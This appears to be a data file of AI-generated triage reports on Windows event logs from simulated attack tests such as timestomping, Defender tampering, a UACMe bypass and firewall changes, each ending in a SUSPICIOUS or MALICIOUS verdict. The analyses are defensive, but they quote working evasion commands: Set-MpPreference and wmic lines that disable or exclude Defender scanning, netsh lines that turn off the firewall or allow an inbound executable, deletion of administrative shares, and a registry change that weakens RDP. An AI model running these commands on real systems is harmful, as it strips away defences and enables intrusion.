1. **Time Manipulation Events in System Log**: 
   - Multiple `EventID: 4616` (Time Change) events in quick succession indicate that the system time was adjusted backward twice in a very short span (from `14:54:24.5021228` to `14:54:20.0160795` and then again back to `14:54:20.0172874`).
   - Such changes can be benign but could also suggest an attempt to disguise log actions or timestamps related to malicious activities. This is often correlated with suspicious activities on the system as attackers might wish to obfuscate their actions.

2. **Privileged Account Activities and Registry Modifications in Security and Sysmon Logs**:
   - The user `admin_test` is observed executing commands and processes with administrative privileges. Particularly, `EventID: 4672` highlights the assignment of various administrative privileges.
   - The suspicious command-line executions via `cmd.exe` modifying registry keys (`LanmanServer`) could imply attempts to alter server behavior - such actions could be part of attempts to disable shared folders’ auto creation, which can be used for lateral movement within a network.

3. **Unusual Execution of Built-in Tools & Items of Interest in Sysmon Logs**:
   - There is repeated use of `wevtutil.exe` and `conhost.exe` which themselves aren't inherently suspicious but might be misused for malicious purposes, especially if coming from a suspicious user context or combined with other indicators.
   - Processes such as `hostname.exe`, `whoami.exe`, and usage patterns suggest script-like behavior or automation for gathering information about the machine, which might be typically seen in an enumeration phase of an attack.

4. **Microsoft Edge Update and COM Helper Executions**:
   - While the consecutive execution of Microsoft Edge Update processes appears legitimate system update-related activities, their correlation and frequency with previously mentioned suspicious changes in registry and time suggest an avenue that needs further exploration into whether the executables could have been tampered or replaced.

5. **Maintained Persistence/Services**:
   - Registry modifications could be indicative of attempts to establish persistence mechanisms on the system or modify system configurations for ease of further access.

### Assessment and Recommendations:
- **Resolution**: SUSPICIOUS
- The logs contain indicators that are typically associated with administrative manipulation, system reconnaissance, and potential attempts to obfuscate activities or maintain persistence, all of which could signal an overall suspicious activity profile. Confirming malicious intent would require correlating other sources (network logs, additional host logs) or artifacts.
- **Recommendations**:
  - Conduct a comprehensive review of the impacted account (`admin_test`) including access logs across the organization and audit all permissions assignments.
  - Verify integrity and origin of executed binaries in question (i.e., check signatures, hashes) to ensure they haven’t been altered.
  - Examine registry snapshots for recent modifications and validate them against expected configurations.
  - Perform network traffic analysis for any potential data exfiltration or command and control communications associated with this activity.
  - Increase monitoring and alerting on sensitive commands and privilege use on this host and potentially others within the environment.
"
Windows - Timestomp a File,"### Analysis of Windows Event Logs

#### Suspicious or Anomalous Behavior Noted:

1. **PowerShell Activities:**
   - **Timestomp PowerShell Script**: Multiple entries from the PowerShell log indicate usage of a script named `timestomp.ps1`. This script was executed with the command `powershell.exe & {import-module ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\timestomp.ps1""; timestomp -dest ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\kxwn.lock""}`.
     - **Timestomp** is associated with malicious activities such as timestamp manipulation of files, often used by malware to evade detection.
   
2. **Sysmon Logs:**
   - **Process Creation Events**: Multiple Sysmon event ID 5 logs show execution of `conhost.exe`, `wevtutil.exe`, and `powershell.exe` by the user `SERVER002\admin_test`.
   - **Process Execution of `wevtutil.exe`**: This utility, when leveraged maliciously, could be used to clear event logs.
   - **High Integrity Level**: Processes executed including PowerShell and `wevtutil.exe` had a high integrity level, indicating elevated privileges, which can be a sign of privilege abuse or escalation attempts.

3. **Unusual Pattern of Usage:**
   - The close timestamps of these suspicious activities suggest they were possibly automated or part of a scripted execution. The activities' rapid succession hints at a planned sequence of commands commonly noticed in attack scripts rather than normal user behavior.

4. **Security and System Logs:**
   - Both logs appear to be empty, which is suspicious when aligned with activities observed in the Sysmon and PowerShell logs. A blank security log may indicate tampering or clearing of event logs which aligns with the usage of `wevtutil.exe`.

5. **Application Logs:**
   - The logs include routine entries related to system processes (specifically Microsoft Edge updates) and do not immediately stand out as related to the potential compromise noted elsewhere.

#### Assessment:

The presence of a `timestomp` PowerShell script execution and command lines associated with potentially malicious activities like `wevtutil.exe`, combined with elevated privileges and a pattern of potential log clearing, strongly suggests signs of a security breach. The manipulation or clearing of event logs typically accompanies unauthorized activities. The absence of security and system logs further amplifies these concerns.

### Resolution:

**Resolution**: MALICIOUS

### Guidance on How to Proceed:

1. **Incident Response Activation:**
   - Immediately begin your organization’s incident response procedures, given the clear indications of malicious activity.

2. **Isolation:**
   - Isolate the affected host (Server002) from the network to prevent further spread or data exfiltration.

3. **Detailed Forensic Analysis:**
   - Conduct a full forensic analysis of the affected system to determine the full extent of the breach.
   - Extract and analyze any artifacts left by the `timestomp` tool to identify impacted files and systems.
   - Review all other available logs for traces of unauthorized access or further indicators of compromise.

4. **Remediation and Monitoring:**
   - Remove any unauthorized or suspicious files, scripts, and processes.
   - Reinforce log monitoring practices to ensure real-time alerts on similar activities in the future.

5. **Security Audit:**
   - Audit user privileges and tighten access controls, especially on accounts with elevated permissions.
   - Implement or enhance endpoint detection and response (EDR) solutions to catch such activities pre-emptively."
Invoke CHM Shortcut Command with ITS and Help Topic,"### Detailed Analysis:

1. **PowerShell Activity**:
   - Multiple instances of `powershell.exe` are executing with specific commands that include `Invoke-ATHCompiledHelp`. This particular command and pattern is unusual and may be indicative of malicious activity, as it doesn't align with typical admin tasks or scripts usually run within enterprises. The command involves executing a PowerShell process with arguments, which suspiciously pertains to compiling or handling help files (`CHMFilePath Test.chm`).

2. **Process Execution**:
   - Several Sysmon events are logged for typical system processes like `conhost.exe`, `wevtutil.exe`, `svchost.exe`, and `taskhostw.exe`, which is normal. However, the power user ""admin_test"" runs `wevtutil.exe` multiple times within a very short period of time, which could indicate an attempt to manipulate or clear event logs. This is a common tactic used by attackers to cover their tracks.
   - The `whoami.exe` and `hostname.exe` processes do not appear inherently suspicious, as they are legitimate Microsoft utilities often used for administrative tasks.

3. **Security Events**:
   - The events tied to security auditing show attempts to access system resources, with logs indicating no credentials were successfully returned. Such repeated access without successful credential retrieval can be indicative of password spray attempts, but in itself, isn't conclusively malicious without additional context.
   - A privileged process `services.exe` showed a normal system logon (`4624` and `4672`), indicating the acquisition of high privileges (`SeDebugPrivilege`, etc.), which could be a normal system operation but is commonly scrutinized in targeted attacks.

4. **Unusual Command Execution**:
   - A PowerShell command segment spotted, `-ExecutionPolicy Restricted -Command ... Get-Item -Path ... Get-Content ... Write-Host 'Final result'`, indicates scripting and evaluating multiple `.inf` files. This behavior, particularly coupled with `ExecutionPolicy Restricted`, might be attempting to identify particular conditions or configurations indicative of evasion or environmental checking.

5. **Windows Update Activity**:
   - Several Windows Update events are logged, describing normal patching of system libraries. The presence of Microsoft update logs does not suggest any irregular activity.

### Assessment:

- **Threat or Risk Identification**: The PowerShell activities and the repeated uses of `Invoke-ATHCompiledHelp` command, combined with wevtutil.exe executions, raise significant concerns around potential malicious scripting behavior and log tampering, respectively.
- **Privileged Token Usage**: High-integrity system access tokens being used are normal for certain contexts, though when checked against logs with possible prior unsuccessful credential attempts and unusual PowerShell activities, they become suspicious.

### Guidance on How to Proceed:

1. **Review PowerShell Scripts**: Investigate contents and origins of suspicious PowerShell commands and check the justification for their existence with the admin user or script owner.
2. **Log Integrity and Retention**: Assess logs for signs of tampering, especially focusing on any missing log entries during crucial times captured from Sysmon or Security log archives prior to and following these events.
3. **Conduct a Threat Hunt**: Initiate broader scans across systems for similar indicators of compromise, focusing on PowerShell execution history and any parallel indices of unauthorized access.

### Resolution: SUSPICIOUS

The logs indicate activity that doesn't look normal for an administrative context, especially the PowerShell commands execution and potential log tampering attempts, warranting deeper investigation."
Uninstall Sysmon,"## Analysis of Windows Event Logs

**Background**: The provided logs come from a Windows machine, specifically a host referred to as ""Server002."" The logs presented include entries from the Application and System channels. Unfortunately, the Security and PowerShell logs are empty, which limits the analysis.

### Event Log Analysis

**Application Log**:

1. **Log Entry**:
   - **Provider**: `edgeupdate`
   - **Message**: `Service stopped`
   - **Timestamp**: `2024-10-28 08:08:58.8042909` & `2024-10-28 08:09:01.1428784`

   **Analysis**:
   - The stopping of the `edgeupdate` service twice in quick succession might suggest an abnormal situation or routine maintenance/updating behavior. Normally, `edgeupdate` is responsible for updating Microsoft Edge, which is not inherently malicious. However, repeated stopping without corresponding start logs could indicate a problem.

2. **Log Entry**:
   - **Provider**: `Microsoft-Windows-Security-SPP`
   - **Message**: `RulesEngine`
   - **Timestamp**: `2024-10-28 08:08:59.7263016`

   **Analysis**:
   - The `Software Protection Platform Service` is related to license management and activation of Windows and other software. A single isolated log doesn't indicate issues without corresponding failure or error logs. It's benign in the context provided.

**System Log**:

1. **Log Entry**:
   - **Provider**: `Microsoft-Windows-FilterManager`
   - **EventID**: `1`
   - **Device Name**: `SysmonDrv`
   - **Timestamp**: `2024-10-28 08:08:48.0740780`

   **Analysis**:
   - The `SysmonDrv` entry suggests the presence of Sysmon, a Microsoft tool for advanced system monitoring and logging. This reflects proactive monitoring/defensive measures rather than a direct sign of compromise.

### Assessment of Activity
- The behaviors outlined in the application log, specifically involving the `edgeupdate` service, show repetitive stops which are unusual without corresponding start events. However, these logs in isolation do not confirm malicious activity definitively. 
- The System log indicating Sysmon suggests active monitoring, which can typically suppress the severity of malicious concerns if it is configured correctly with alerting mechanisms in place.

### Conclusion
- **Resolution**: SUSPICIOUS

**Rationale**: While the logs do not contain explicit evidence of an attack, the repeated stopping of a system update service is suspicious, especially in the absence of start or update success logs. This activity merits further investigation to either confirm a legitimate scheduled update/maintenance sequence or identify a potential service manipulation by unauthorized entities.

### Recommendations
- **Further Investigation**: Cross-reference these logs with network logs, security logs (once available), and any related user activity reports to confirm whether this repetition is expected as part of maintenance or if it indicates an intrusion attempt.
- **Check for Patterns**: Look for patterns in similar time frames across other logs for anomalies or corroborating incidents.
- **Review Sysmon Configurations**: Ensure Sysmon is configured to capture and alert on critical indicators of compromise.
- **Security Posture Review**: Conduct a review of update service management protocols and permissions settings to prevent unauthorized interruption."
Tamper with Windows Defender ATP PowerShell,"### Analysis of Windows Event Logs

#### Suspicious or Anomalous Behavior:

1. **PowerShell Logs:**
   - The execution of a PowerShell command to disable multiple Windows Defender protections is highly suspicious. The command-line arguments executed as part of `powershell.exe` include:
     ```powershell
     Set-MpPreference -DisableRealtimeMonitoring 1
     Set-MpPreference -DisableBehaviorMonitoring 1
     Set-MpPreference -DisableScriptScanning 1 
     Set-MpPreference -DisableBlockAtFirstSeen 1
     ```
   - These commands effectively reduce the system's defenses against malware, which could indicate an attempt to evade detection by Windows Defender.

2. **Application Logs:**
   - There are multiple entries of Windows Defender being put in a ""SECURITY_PRODUCT_STATE_SNOOZED"" state. This aligns with the PowerShell activity disabling its monitoring features, confirming an intentional disabling of security mechanisms.

3. **Sysmon Logs:**
   - Frequent process executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` are logged. These actions might suggest log tampering or creation of new logs, possibly to cover tracks.
   - There is a notable instance of `powershell.exe` called with the same malicious command-line arguments seen in the PowerShell log, further corroborating intentional disabling of security features.

4. **Security Logs:**
   - The security log does not provide specific indicators of compromise but supports the timeline and activities occurring within the system.

5. **System Logs:**
   - Log entries indicating manipulation of the system time could suggest an attempt to hide malicious activity or confuse log timelines, potentially interfering with time-based alerts and responses.

#### Assessment of the Situation:

The logs show clear indications of activity that is potentially malicious. The disabling of Windows Defender through PowerShell is a red flag. Typically, legitimate users do not need to disable security features, and doing so is common in attempts to execute or spread malware without interference from security tools. The Sysmon logs provide evidence of processes that could potentially manipulate or query event logs, possibly to cover attacker tracks. Furthermore, the changes to the system time suggest a sophisticated effort to conceal or manipulate the system's activity timeline.

#### Conclusion and Resolution:

- **Resolution: MALICIOUS**

The combined findings of disabling security features, possible log tampering efforts, and time manipulation strongly suggest unauthorized and malicious activity. Immediate investigation and response are recommended to determine the source and scope of the compromise and mitigate potential risks.

#### Guidance on How to Proceed:

1. **Isolate the Host:**
   - Immediately isolate the affected machine from the network to prevent further spread of a potential compromise.

2. **Conduct Further Investigation:**
   - Analyze the origin of the executed PowerShell commands and associated user accounts to determine potential unauthorized access.
   - Review user activity surrounding the time of these entries to identify possible unauthorized logins.

3. **Restore Security Features:**
   - Re-enable and verify the functionality of Windows Defender and other security measures.

4. **Review and Harden Security Policies:**
   - Ensure that PowerShell logging and other security measures are in place and bolster access controls and monitoring for similar activities.

5. **Evaluate and Clean the System:**
   - Carry out a comprehensive malware scan and forensic analysis to ensure no residual threats remain and identify any possible rootkits or persistent threats.

6. **Update and Patch:**
   - Ensure all software, especially security tools, are updated to the latest versions to mitigate vulnerabilities.

The activity and provided evidence show signs of a potential active compromise that needs to be remedied immediately."
Remove Administrative Shares,"After reviewing the provided log entries, here is the detailed analysis:

### Suspicious or Anomalous Behaviors Identified:

1. **Time Synchronization Discrepancy**
   - The system log and security log entries show multiple events where the time was adjusted. While time synchronization activities are common, such frequent changes could suggest an attempt at log manipulation to cover tracks.

2. **Unusual PowerShell Activity**
   - There are no entries in the provided PowerShell log, which may indicate a lack of data or potential tampering with the logs. This absence should be investigated further to determine if any PowerShell activity was cleared to conceal some malicious commands.

3. **Windows Command Prompt (cmd.exe) Usage**
   - The Sysmon logs display the execution of `cmd.exe` with the command line `\""cmd.exe\"" /c for %%i in (C$ IPC$ ADMIN$) do net share %%i /delete`. This command is used to remove administrative shares (C$, IPC$, ADMIN$), which is unusual unless done intentionally. This could indicate an attempt to disrupt network share access, potentially hindering remote management or forensic investigation efforts.

4. **Net Commands**
   - The execution of `net` and `net1` commands to delete network shares (`C$`, `IPC$`, `ADMIN$`) further signifies a potential attempt to disrupt legitimate network operations. These actions are consistent with tactics used by adversaries to prevent detection or limit forensic activities.

5. **Process Executions**
   - Multiple executions of **svchost.exe**, **whoami.exe**, **hostname.exe**, and **wsmprovhost.exe** appear in the logs, but their frequency and parent-child relationships suggest execution under a legitimate user's context. However, the `net share` deletion commands executed could be concerning when done at high integrity levels.

### Assessment:
Given these observations, the logs feature several operations that are suspicious, particularly around network shares and time manipulation. While no direct evidence of malware is visible, the activities align with techniques that could be malicious in nature, primarily if they weren't authorized by system administrators. The adjustment of time and termination of network shares also mirrors tactics used by threat actors post-compromise.

### Final Resolution: SUSPICIOUS
This case is categorized as suspicious. While the observed actions might have legitimate explanations, the absence of expected PowerShell logs and commands disabling key network shares at a system level under high-integrity contexts warrant further investigation.

### Recommended Next Steps:
- **Verify Administrative Actions**: Confirm with system administrators if these actions were authorized and documented maintenance activities.
- **Review PowerShell Logging Policies**: Ensure adequate logging and monitor configurations are in place; look for any gaps in PowerShell logging or potential manipulation.
- **Network Activity Review**: Investigate network logs related to this host for unusual outbound or lateral-movement activities.
- **Endpoint Security Scan**: Conduct a thorough scan of the endpoint for any indicators of compromise not evident in the logs provided.
- **Time Source Verification**: Confirm the time source configuration to ensure it’s set appropriately and monitored for any deviations."
RDP Authentication Level Override,"Upon analyzing the provided Windows event logs, here is a detailed assessment:

### Suspicious or Anomalous Behavior:

1. **Usage of `wevtutil.exe`**:
   - There are multiple instances where `wevtutil.exe`, a command-line utility for managing event logs, was executed. This tool can be used legitimately for querying or backing up logs but might also be leveraged by attackers to clear logs and hide malicious activity.

2. **Registry Modification**:
   - There is an event where `reg.exe` is used to modify the registry key associated with Terminal Services Client Authentication (`AuthenticationLevelOverride`). This type of change can be indicative of an attempt to weaken security settings for Remote Desktop connections, enabling potential lateral movement or unauthorized access.

3. **Execution of `whoami.exe` and `hostname.exe`**:
   - The processes `whoami.exe` and `hostname.exe` have been executed. These tools are commonly used for gathering environment information and determining the current user context, which might indicate a reconnaissance phase by a malicious actor.

4. **Command Line with `cmd.exe`**:
   - The command `""cmd.exe"" /c reg add ""HKCU\Software\Microsoft\Terminal Server Client"" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f` was executed. This indicates that someone, likely with administrator privileges, made a registry change potentially affecting RDP settings without explicit documentation or reason in the logs.

5. **Usage of Admin Privileges**:
   - The user `admin_test` was active in executing these commands and applications. The same user's privilege escalation is indicated by the `SeDebugPrivilege`, among others. These privileges can be misused to explore or alter the system environment.

6. **Time Manipulation**:
   - There are events displaying time discrepancies or adjustments (`NewTime` and `OldTime`). While also potentially legitimate (e.g., due to daylight savings time or network time protocol updates), time changes can sometimes be indicative of attempts to disrupt log synchronization or integrity.

### Assessment of the Situation:

The combination of events captured in the logs suggests that there might be a potential security incident brewing. The execution of utilities like `wevtutil.exe` and `reg.exe` in conjunction with altered RDP settings, usage of admin privileges, and log manipulations are symptomatic of system probing and potential malicious activity.

### Threats or Risks Identified:

- Possible malicious intent to manipulate logs and hide tracks.
- Modifications weakening system security, potentially for unauthorized RDP access.
- Reconnaissance or furtherance of privilege exploration.
- Possible unauthorized administrative-level changes to the system.

### Recommended Action and Guidance:

- **Immediate Review**: Investigate the intent and legitimacy of the actions performed by `admin_test`. Determine if these actions were scheduled maintenance or unauthorized activity.
- **Audit Current Settings**: Check the current RDP and security configurations against baseline standards to spot any unauthorized changes.
- **User Behavior Analysis**: Examine past activity logs for `admin_test` for any inconsistent patterns or unauthorized logins.
- **Security Controls**: Ensure that security controls like multi-factor authentication, least privilege principle, and regular audit logging are enforced.

### Resolution:

Given the analyzed evidence and the potential implications, the resolution for this log entry analysis is:

- **SUSPICIOUS**: The activities observed warrant further investigation to rule out any malicious intent or unauthorized system modifications."
Tamper with Windows Defender Evade Scanning -Extension,"Upon analysis of the provided Windows event logs, I have identified several key points relevant to determining the status of the system in question:

1. **System logs**:  
   - The `Microsoft-Windows-Kernel-General` logs show adjustments to the system time. The process responsible is `svchost.exe`, which is a standard system process used for hosting services. The time change appears minimal and the reason is internal (likely a system correction), indicating normal system behavior.

2. **Application logs**:  
   - The presence of the `edgeupdate` and `Microsoft-Windows-Security-SPP` events reflects normal operations related to software updates and the Software Protection Platform Service. No anomalies are apparent in this section.

3. **PowerShell logs**:  
   - PowerShell event logs are noteworthy due to the execution of a script via `powershell.exe` which involved the `Add-MpPreference -ExclusionExtension` command. This command modifies Windows Defender's preferences, possibly excluding executable (.exe) files from scans. This is suspicious as it could be leveraged for malicious purposes, either to evade detection by antivirus software or to operate with fewer restrictions.

4. **Sysmon logs**:  
   - Multiple instances of common and benign system processes (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) were executed by the user ""SERVER002\\admin_test"". This suggests potential system work or script execution.
   - The installation and update operations related to Microsoft Edge are repeatedly logged, involving components such as `MicrosoftEdgeUpdateSetup.exe`. These actions appear consistent with typical application update procedures.

### Key Concerns:
- The PowerShell activity regarding the exclusion of `.exe` files from Windows Defender indicates potential misconfiguration or an attempt to bypass security mechanisms, warranting further investigation.

### Conclusion:
Based on the insights mentioned, the resolution is:

- **SUSPICIOUS**: The PowerShell command to add an exclusion for `.exe` files from Windows Defender scans is an activity requiring further investigation. This action, especially performed through scripts, can be associated with attempts to introduce or hide malicious files on the system.

### Suggested Actions:
- Review the context of the PowerShell session for legitimacy, including the user’s intent and any preceding or succeeding commands for context.
- Check for any unauthorized changes in the user's roles and permissions.
- Perform a comprehensive antivirus scan of the system to ensure no threats were undetected due to the PowerShell exclusion setting.
- Audit user ""SERVER002\\admin_test"" activities for any additional suspicious patterns consistent with this exclusion practice."
WMIC Tamper with Windows Defender Evade Scanning Folder,"After examining the provided logs, let's go through the notable entries:

### Application Log
There is no significant evidence of suspicious activity from the single log entry related to the Software Protection Platform Service (SPPSVC), which usually tracks licensing and activation tasks.

### Sysmon Log
The Sysmon logs show a sequence of process creations and terminations, mainly by the user ""SERVER002\admin_test"". Key observations include:

1. **Frequent Execution of Built-in Windows Utilities**:
   - **`wevtutil.exe` and `conhost.exe`** are seen multiple times. These are legitimate Windows programs used for viewing and managing event logs and console window hosting, respectively. The appearance of these processes alone is not inherently suspicious.

2. **`cmd.exe` and `wmic.exe` for Windows Defender Exclusion**:
   - We observe a `cmd.exe` process with the command line:
     ```
     ""cmd.exe"" /c wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=""file""
     ```
   - This line indicates the addition of an exclusion path to Windows Defender, executed from WMIC (Windows Management Instrumentation Command-line). This is suspicious if it was not authorized, as it can be used by malware or an attacker to disable antivirus protections, potentially allowing other malicious activities to proceed without interference.

3. **`hostname.exe` and `whoami.exe` executions**:
   - While `hostname.exe` and `whoami.exe` are legitimate utilities, their usage without clear need or context can be suspicious if launched repeatedly or by an unauthorized script or user.

4. **High Integrity Level Execution**:
   - Many of these processes, such as `cmd.exe`, are executed with high integrity, which suggests elevated permissions and should be scrutinized if the executing account ('admin_test') was not expected to run such commands.

5. **Integrity Level and User Context**:
   - The activities are executed under a user account with high privileges ('admin_test'), indicating a potential risk or compromise particularly if this account's actions were not authorized.

### System Log & Security Log
- **Time Synchronizations**:
  - The security and system logs include events where the system time was modified. While time changes can happen for legitimate synchronization purposes, unexpected time changes can be investigated to ensure they were approved and not used to obscure the timeline of malicious activities.

### Final Assessment
Given the combination of potentially altering Windows Defender settings, frequent executions of specific utilities without clear justification, alongside high-integrity-level operations from what seems like an administrative account, the logs are labeled:

**SUSPICIOUS**

### Recommendations
- **Investigation:**
  - Confirm if the user 'SERVER002\admin_test' scheduled or required these operations.
  - Verify any changes made to Windows Defender exclusions and rectify if unauthorized.
  - Check broader context and timeline around these events for additional correlated activities.

- **Security Measures:**
  - Implement stricter access controls and logging for high-privilege accounts.
  - Ensure Windows Defender settings and other security configurations adhere to organizational policies.

- **Monitoring:**
  - Conduct further monitoring for any subsequent activities involving critical system utilities or privilege escalation attempts. 

This case needs immediate attention to ascertain the intent and authorization behind these events, requiring further investigation."
Disable Microsoft Defender Firewall,"Upon analyzing the provided Windows event logs, here is the breakdown of the findings:

### Application Log
- The Application log shows a single event from the Software Protection Platform Service (SPP). This event appears routine and benign related to the software protection platform updating rules, with no indicators of malicious activity.

### System Log
- The System log has no remarkable indication of suspicious activity. The events logged are primarily related to time synchronization, service state changes (such as IKEEXT), and system processes. Time changes seem legitimate as they are close and appear to be automatic adjustments, rather than significant, potentially malicious time changes.

### Security Log
- The Security log indicates user activities and privilege escalations.
  - Event ID 4624: Shows multiple logon events, notably using NTLM authentication.
  - Event ID 4672: Indicates privileged logon sessions for the user ""admin_test"" with a variety of privileges including SeDebugPrivilege, which could be of concern.
  - Event ID 4634: Shows logoff events which are normal as part of session activities.
  
  The log highlights that ""admin_test"" has high-level privileges, which could be normal for an admin account, but needs scrutiny to ensure that this privilege escalation was legitimate and not abused.

### Sysmon Log
- The Sysmon logs show numerous process creations, notably:
  - Execution of `wevtutil.exe`, `conhost.exe`, and `netsh.exe` by the user ""SERVER002\\admin_test"".
  - `CMD.exe` executed a command to turn off the Windows Firewall with the command `netsh advfirewall set currentprofile state off`. This particular command is a significant red flag, indicating an attempt to disable the system's firewall, which is often associated with malicious activity.

### Assessment
- **Suspicious Behavior**: The execution of the `netsh advfirewall set currentprofile state off` command by a user account with high privileges is suspicious. Disabling a firewall can be an indication of an attempt to weaken the system's security for malicious purposes. The use of `whoami.exe`, `wevtutil.exe`, and `cmd.exe` in quick succession might relate to investigative or system-altering actions—potentially legit when performed by an admin, but they warrant closer scrutiny if not accounted for.
  
### Resolution: **SUSPICIOUS**

- Although there is no direct evidence of malware execution, the disabling of the firewall and use of admin privileges suggest actions that require further investigation to verify legitimacy. It is crucial to check:
  - The intent and authorization behind the firewall command.
  - Whether ""admin_test"" is a known and valid administrator and if the actions align with typical behavior for this user.
  - Network logs or alerts around the time of this activity for any malicious communication attempts.

### Guidance
1. **Conduct a Full Investigation**: Focus on verifying the legitimacy of the `admin_test` user actions.
2. **Review Access Logs**: Check audit logs and recent changes to the system and configuration files.
3. **Validate” Firewall and Network Settings**: Ensure firewall settings are restored and examine network traffic patterns.
4. **Monitor**: Set up real-time alerts for further suspicious activity involving admin accounts or critical security settings modifications.

Given these actions, the activity in the logs could well be regular maintenance or an investigation by IT, but the disabling of the firewall necessitates further validation."
UACME Bypass Method 39,"Based on the examination of the logs provided, the following analysis and assessment have been conducted:

1. **Anomalous Behavior Identified**:
   - The Sysmon logs show the execution of Windows Command Processor (`cmd.exe`) with the following command-line argument:
     ```
     ""C:\\Windows\\system32\\cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\uacme\\39 Akagi64.exe""
     ```
     The execution of `Akagi64.exe` from a temporary directory, particularly under a path that includes ""uacme,"" is a strong indicator of potential unauthorized activities. UACMe is a known tool used for User Account Control (UAC) bypass techniques, which attackers often use to escalate privileges on a system.

2. **Process Involvement**:
   - The parent process for the suspicious `cmd.exe` execution was `powershell.exe`, as indicated by:
     ```
     ParentCommandLine: powershell.exe & {$tempPath = cmd /c echo C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\uacme\\39 Akagi64.exe}
     ```
     This further emphasizes suspicious scripting activity, commonly indicative of attempts to automate malicious tasks or test presence and paths before further execution.

3. **Additional Findings**:
   - Multiple logs show normal activities associated with Microsoft Edge Update and system processes running under NT AUTHORITY\SYSTEM. These activities are typical for system update processes and do not appear related to malicious activity.

4. **Security Overview**:
   - Windows Defender is reported as actively running, which indicates that the system's security measures were enabled during the logging period.

**Assessment**:
Given the presence of the ""uacme"" tool and the evidence of its execution through command-line operations initiated by `cmd.exe`, these activities are highly suspicious. The use of a UAC bypass tool points towards possible malicious intent to elevate privileges illegitimately on the system.

**Resolution**: **MALICIOUS**

**Recommended Actions**:
- Immediately investigate the `admin_test` user account's activities.
- Isolate the host from the network to prevent potential spread or further compromise.
- Conduct a detailed forensic analysis to understand the extent of the breach, including file creation and modification timestamps.
- Remove any unauthorized tools or scripts identified during the investigation.
- Assess for any lateral movement and the presence of secondary payloads.
- Strengthen security alerts and monitoring to detect and respond to similar threats in the future.
- Review and update UAC policy settings to mitigate future bypass attempts."
InstallUtil class constructor method call,"Upon analysis of the provided logs, several indicators require attention:

1. **Security & System Logs:**
   - The Security and System logs primarily contain time synchronization activities, notably EventID 4616 events related to changes in system time. The repeated time corrections can sometimes be associated with malicious activity like timestomping, but in this context, these changes are coherent and continuous, indicating a normal legitimate time sync behavior.
   
2. **PowerShell Logs:**
   - There is suspicious usage of PowerShell scripts with the `Import-BuildAndInvokeInstallUtilAssembly` operation seen in PowerShell logs. The invocation includes compiling and running .NET binaries which may be an attempt to execute arbitrary code or to load and run malicious assemblies without detection.
   - PowerShell scripts are running from the TEMP directory, which is a generic pattern observed in malicious activities, especially since it attempts to use an `InstallUtilTestHarness.ps1` script.

3. **Sysmon Logs:**
   - The logs reveal the execution of various processes commonly seen in system activities such as `HOSTNAME.EXE`, `whoami.exe`, and Microsoft Edge Update executables, etc., most of these are legitimate.
   - However, there are executions related to `InstallUtil.exe` with a DLL from the TEMP directory (`data.004.dll`). The usage of InstallUtil with custom DLLs is a known technique for code execution.
   - The file `data.004.dll` created and executed via `InstallUtil.exe` implies execution of compiled code through CLI, which aligns with a possible malicious activity pattern if not associated with legitimate software testing/debugging.
   - Multiple operations with Sysinternals toolsets such as `conhost.exe`, `wevtutil.exe` are part of standard operating procedures, but without context, can not be ruled out entirely.

4. **Assessment:**
   - The PowerShell activity, combined with the execution through `InstallUtil.exe` from TEMP, strongly indicates the system could be used or is compromised by someone testing or actively deploying malicious code.
   - Although logs show expected Microsoft Edge update activities, the processes intertwined with debugging and potential code execution from temporary directories carry characteristics of being potentially compromised.

**Resolution: SUSPICIOUS**

**Guidance:**
To proceed, further investigation and verification are required:
- **Check the legitimacy of the `data.004.dll` file:** Investigate its source, usage, and ensure it is legitimate.
- **Audit user activities:** Verify the legitimacy of actions performed by `SERVER002\admin_test`. Check whether the observed activity aligns with authorized software testing or debugging practices.
- **Conduct a threat hunt:** Look for lateral movement, persistence mechanisms, or data exfiltration activity across the network linked to this system.
- **Monitor for indicators of compromise:** Set up alerts for activities matching these logs to prevent or respond promptly to any further unauthorized actions.
- **Deploy additional endpoint protection and monitoring:** Consider deploying more stringent monitoring and behavioral analysis to detect anomalous activities."
Allow Executable Through Firewall Located in Non-Standard Location,"### Analysis of Windows Event Logs

#### **System Log Analysis**

From the provided system logs, we do not observe any notably suspicious activities. All log entries appear to be normal system activities such as time updates and service interactions typically seen in regular operations. There are no indications of privilege escalation or unusual process behavior directly in the system log entries.

#### **Application Log Analysis**

The application logs describe `edgeupdate`, which is a known service for updating Microsoft Edge. The logs indicate that the service has stopped, which in itself is not inherently suspicious without additional context such as whether it was expected to stop, hence no immediate concerns are noted here.

#### **Windows PowerShell Log Analysis**

PowerShell logs reveal the execution of a potentially suspicious command. This command involves copying an executable (`fileTest.exe`) from a temporary directory to the user's directory, followed by modifying firewall rules to allow it. Creating such rules without explicit user permission or need might indicate an attempt to bypass normal security protocols:

- `Copy-Item ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\bin\fileTest.exe"" -Destination ""C:\Users\$env:UserName"" -Force netsh advfirewall firewall add rule name=""file Test"" dir=in action=allow program=""C:\Users\$env:UserName\fileTest.exe"" enable=yes`.

The activity suggests an attempt to allow `fileTest.exe` to have inbound connections, which can be indicative of malicious activity if this action was not expected.

#### **Sysmon Log Analysis**

The Sysmon log entries provide detailed process creations and involve execution of typical system processes; however, specific attention should be paid to the correlation of processes and their parents. Notably, a PowerShell process executing similar objectives as identified in the PowerShell event log suggests that this activity was initiated through a service like `wsmprovhost.exe`, which can be benign but noteworthy if unexpected.

Further, processes like `netsh.exe` and `conhost.exe` show high integrity level executions which might be legitimate if executed with administrative privileges under normal circumstances, yet still require cross-verification with expected system operations to dismiss any unauthorized privilege escalation attempt.

### Assessment and Recommendation

After analyzing the logs, the behavior involving the PowerShell command stands out as potentially harmful, particularly due to the manipulation of firewall settings which matches known tactics for establishing backdoor access or persistence mechanisms on a system.

Resolution: **MALICIOUS**
- **Indicators of Compromise**:
  - Unjustified copying of executable files into user directories.
  - Adjustments to firewall rules allowing an unknown executable, potentially bypassing security measures.

#### **Guidance:**
